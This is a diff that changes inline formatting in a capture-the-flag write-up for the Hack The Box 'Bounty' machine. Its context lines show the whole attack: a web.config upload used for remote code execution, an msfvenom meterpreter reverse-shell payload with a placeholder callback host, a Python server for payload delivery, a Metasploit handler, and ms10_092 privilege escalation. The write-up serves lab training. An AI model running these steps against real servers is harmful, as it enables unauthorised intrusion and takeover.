@@ -20,7 +20,7 @@
 
 First, we check the IP of the
 link:https://www.hackthebox.eu/home/machines/profile/142[Bounty]
-machine and try a +ping+
+machine and try a `ping`
 to see if we have access.
 
 image::bounty-ip.png[ip]
@@ -33,26 +33,26 @@ host$ ping -c2 10.10.10.93
 
 image::ping.png[ping]
 
-Then, we scan the ports with +nmap+.
-In this case, we’re going to use basic +nmap+.
+Then, we scan the ports with `nmap`.
+In this case, we’re going to use basic `nmap`.
 
 [source, bash]
 ----
 host$ nmap 10.10.10.93
 ----
 
-And, we see that there is only one port open +port 80+.
+And, we see that there is only one port open `port 80`.
 
 image::nmap.png[nmap]
 
-Then, we try to access +port 80+ with our browser,
+Then, we try to access `port 80` with our browser,
 and it opens a web page with an image of Merlin.
 
 image::web.png[web-page]
 
 As we see on this page,
 there is nothing more than an image,
-so we’re going to scan the whole web server with +dirbuster+
+so we’re going to scan the whole web server with `dirbuster`
 to see if we can access something useful.
 
 [source, bash]
@@ -65,10 +65,10 @@ image::dirb.png[dirb-scan]
 
 Here we found a folder where uploaded files are stored.
 We need the page of the upload functionality.
-With +dirbuster+, and some options,
+With `dirbuster`, and some options,
 we can set different extensions and obtain what we are looking for.
-Since this is a +Windows+ machine,
-we are going to use +asp+ and +aspx+ extensions.
+Since this is a `Windows` machine,
+we are going to use `asp` and `aspx` extensions.
 
 [source, bash]
 ----
@@ -87,7 +87,7 @@ and check the result.
 
 image::upload1.png[upload1]
 
-But if we try with a webshell in +aspx+ or +asp+
+But if we try with a webshell in `aspx` or `asp`
 it returns an error.
 
 image::upload2.png[upload2]
@@ -97,10 +97,10 @@ that possibly checks the extension of the uploaded file.
 If you try with double extension it won’t work either.
 
 So what can we do?
-In +Windows+ there are +3+ major types of extensions:
-+asp+, +aspx+, and +config+.
-We already tried the +asp+ and +aspx+ extensions,
-what happens if we upload a +web.config+ file?
+In `Windows` there are `3` major types of extensions:
+`asp`, `aspx`, and `config`.
+We already tried the `asp` and `aspx` extensions,
+what happens if we upload a `web.config` file?
 
 [source, xml,linenums]
 ----
@@ -131,20 +131,20 @@ what happens if we upload a +web.config+ file?
 image::upload1.png[upload11]
 
 We can see the result is positive.
-The +web.config+ file is used by +IIS+ servers
-to store settings that come with the installation of the +API+.
+The `web.config` file is used by `IIS` servers
+to store settings that come with the installation of the `API`.
 
 With this, we can start to exploit this machine.
-There is a vulnerability on the +web.config+ file processing
+There is a vulnerability on the `web.config` file processing
 that could allow an attacker to execute code remotely,
-by injecting +asp+ code in the file
+by injecting `asp` code in the file
 (More information can be found
 link:https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/[here]
 ).
 
-So, in order to have remote code execution (+RCE+),
+So, in order to have remote code execution (`RCE`),
 we need to add the following lines
-to our +web.config+ file:
+to our `web.config` file:
 
 ----
 <!--
@@ -169,12 +169,12 @@ image::rce-ok.png[rce-ok]
 *Eureka!* With this, we can have our user flag,
 but we want an active shell
 that we can use for further enumeration.
-For this, we can use +msfvenom+.
+For this, we can use `msfvenom`.
 This is a tool that creates payloads
 in order to gain access to a machine.
-It is installed by default on +Kali+;
-it also comes with the installation of +Metasploit+.
-Then, we upload our file to the server with our +RCE+
+It is installed by default on `Kali`;
+it also comes with the installation of `Metasploit`.
+Then, we upload our file to the server with our `RCE`
 and start a web server on our side
 to download our exploit.
 
@@ -187,13 +187,13 @@ host$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=ip.ip.ip.ip LPORT=port -
 
 This will create a malicious file.
 When executed on the server
-it will give us a reverse shell with our +RCE+ file using +meterpreter+.
+it will give us a reverse shell with our `RCE` file using `meterpreter`.
 This is an advanced, dynamically extensible payload
-that uses in-memory +DLL+ injection stagers,
+that uses in-memory `DLL` injection stagers,
 and is extended over the network at runtime.
 
 Then we need to start a web server in our machine.
-We can do it with +Python+ by running:
+We can do it with `Python` by running:
 
 [source, bash]
 ----
@@ -201,9 +201,9 @@ host$ python -m SimpleHTTPServer 7000
 ----
 
 To make the server download our file,
-we can use the next +PowerShell+ command
-in our +web.config+ file
-replacing the +whoami+ one:
+we can use the next `PowerShell` command
+in our `web.config` file
+replacing the `whoami` one:
 
 [source, xml]
 ----
@@ -216,7 +216,7 @@ Now, we can see that the server downloaded our file.
 image::download.png[download]
 
 Then we need to start our listener.
-We can use +Metasploit+ to do it:
+We can use `Metasploit` to do it:
 
 [source, bash]
 ----
@@ -231,7 +231,7 @@ msf exploit(multi/handler) > run
 With this, we are ready to initiate our reverse shell.
 In order to do it,
 we need to run our exploit on the server
-with the same +RCE+ method as before,
+with the same `RCE` method as before,
 changing the command to the following:
 
 [source, xml]
@@ -239,21 +239,21 @@ changing the command to the following:
 Set cmd1 = wShell1.Exec("cmd.exe /c C:\Windows\Temp\myexploit.exe")
 ----
 
-Upload it, open the page of the +web.config+ file
+Upload it, open the page of the `web.config` file
 and we have our reverse shell.
 
 image::reverse-shell.png[reverse-shell]
 
 == Getting root
 
-With +meterpreter+
+With `meterpreter`
 we can start to enumerate the server.
 
 image::sys-info.png[sys-info]
 
-And, we see that the server has an +x64 Architecture+.
+And, we see that the server has an `x64 Architecture`.
 We are going to repeat the process
-(+msfvenom+, +upload+, +handler+, +run+)
+(`msfvenom`, `upload`, `handler`, `run`)
 but now with the payload:
 
 ----
@@ -271,7 +271,7 @@ meterpreter > run post/multi/recon/local_exploit_suggester
 image::exploit-suggester.png[exploit-suggester]
 
 Here we got some exploits
-that we can use to elevate to +Administrator+,
+that we can use to elevate to `Administrator`,
 we are going to use the first one with:
 
 [source,bash]
@@ -287,14 +287,14 @@ msf exploit(windows/local/ms10_092_schelevator) > run
 
 When it finishes,
 we will have a new session created
-and with user +NT Authority\System+.
+and with user `NT Authority\System`.
 
 image::admin.png[admin]
 
-With this we can read our +root+ flag.
+With this we can read our `root` flag.
 
 On this challenge, we learned there was a vulnerability
-with the +web.config+ file.
+with the `web.config` file.
 We also learned to always check the architecture
 when we access a machine as a user,
-and how to use some of the +meterpreter+ commands.
+and how to use some of the `meterpreter` commands.
